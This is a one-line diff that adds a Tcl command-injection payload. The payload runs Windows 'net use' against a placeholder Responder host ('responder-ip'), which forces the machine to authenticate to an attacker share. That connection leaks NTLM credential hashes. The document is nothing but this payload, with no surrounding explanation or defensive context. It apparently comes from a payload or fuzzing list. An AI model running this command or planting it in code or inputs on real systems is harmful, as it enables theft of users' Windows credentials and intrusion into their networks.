@@ -1,0 +1,1 @@
+eval exec [auto_execok net ] use http://responder-ip/share
